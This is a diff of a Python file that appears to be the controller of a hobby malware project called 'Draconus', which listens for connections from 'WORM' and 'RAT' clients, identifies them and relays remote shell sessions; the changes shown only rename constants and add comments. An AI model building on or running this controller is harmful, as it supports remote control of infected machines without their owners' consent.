@@ -8,9 +8,6 @@ FORMAT = 'utf-8'
 # length of message (256 bytes)
 RAW_LEN = 256
 
-# length of output message (4 kb)
-OUT_LEN = 4096
-
 # length of response message (1 bytes)
 RAW_ERROR = 1
 
@@ -23,10 +20,8 @@ TYPE_WORM = 'WORM'
 TYPE_RAT = 'RAT'
 
 # message to disconnect
-MSG_DISC = 'MSG_DISC'
+MSG_DISC = 'DISCONNECT'
 
-# prepare to send Message
-TYPE_MSG = 'TYPE_MSG'
 
 # message to start shell
 SHELL_START = 'SHELL START'
@@ -34,6 +29,8 @@ SHELL_START = 'SHELL START'
 # message to exit the shell
 SHELL_EXIT = 'EXIT'
 
+
+# This class prepare message to send via TCP
 class Msg:
     def __init__(self, msg, formats=FORMAT, raw_len=RAW_LEN):
         if msg == '':
@@ -78,6 +75,9 @@ class Draconus:
         self.synergy = None
 
     
+    # START DRACONUS
+    # Each time a connection is made, the worm will be identified
+
     def start(self):
         self.server.listen(6)
         print('*********************************************************')
@@ -139,6 +139,9 @@ class Draconus:
             pass
 
 
+    # Recive a output in 2 steps:
+    # first: recive length of message
+    # second: recive a message
     def recive_output(self):
         len_out = self.recive_pocket()
         length = int(float(len_out))
@@ -170,11 +173,15 @@ class Draconus:
             print(f'[DRACONUS] This is {self.synergy} !!! ')
             return True
 
+
+
     def show_output(self, output):
         print(f'[DRACONUS] ************** New Message From {self.synergy} ****************')
         print(f'[{self.synergy}] {output} ')
         print('[DRACONUS] **************************************************************')
         return output
+
+
 
     def handle_RAT(self):
         command = None
